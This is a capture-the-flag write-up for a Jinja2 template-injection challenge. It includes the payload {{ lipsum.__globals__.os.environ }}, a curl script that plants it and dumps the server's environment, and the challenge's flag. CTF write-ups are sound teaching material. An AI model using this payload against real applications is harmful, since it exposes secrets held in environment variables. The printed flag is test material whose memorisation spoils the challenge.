---
title: "Vault 101 RobCo Termlink — Overseer's Sealed Directive"
ctf: "bitCTF"
date: 2026-06-19
category: web
difficulty: easy
points: TBD
flag_format: "bitctf{...}"
author: "CL4Y"
---

# Vault 101 RobCo Termlink — Overseer's Sealed Directive

## Summary

The resident terminal renders user-supplied "greetings" through Jinja2
without escaping (**SSTI**). The dashboard tip — *"INSCRIPTION MACROS USE
VAULT-TEC DOUBLE-BRACE SYNTAX"* — is a deliberate `{{ }}` hint. Pulling
`os.environ` through `lipsum.__globals__` dumps the Flask process env,
which contains the flag.

## Solution

### Step 1: Enroll and confirm SSTI

Register an ordinary resident, then post `{{7*7}}` as the greeting.
`/terminal` renders `49` — Jinja2 is evaluating user input server-side.

### Step 2: Pivot to `os.environ` and read the flag

The "sealed directive never leaves the runtime environment" hint points
at env vars. `lipsum` is a Jinja2 builtin whose `__globals__` exposes
the Flask module's `os` import, giving us `os.environ`.

```bash
#!/usr/bin/env bash
TARGET="https://world-01b7bdc3538d49fa9230dfc363-ddzse.ondigitalocean.app"
USER="resident-x9"; PASS="password123"
CJ=$(mktemp)

# 1. Enroll a resident (access code must be ≥ 8 chars)
curl -sL -c "$CJ" -d "vault_id=$USER&access_code=$PASS" "$TARGET/enroll" -o /dev/null

# 2. Log in to get a session cookie
curl -sL -b "$CJ" -c "$CJ" -d "vault_id=$USER&access_code=$PASS" "$TARGET/access" -o /dev/null

# 3. Burn the SSTI payload into the greeting
curl -sL -b "$CJ" --data-urlencode \
  "greeting={{ lipsum.__globals__.os.environ }}" \
  "$TARGET/inscribe" -o /dev/null

# 4. Render the terminal — greeting is now the full env dump
curl -sL -b "$CJ" "$TARGET/terminal" | grep -oE "bitctf\{\{[^}]+\}\}"
# bitctf{{w4r_n3v3r_ch4ng3s_0verseer_t3rm1nal_pwn3d}}
```

## Flag

```
bitctf{{w4r_n3v3r_ch4ng3s_0verseer_t3rm1nal_pwn3d}}
```
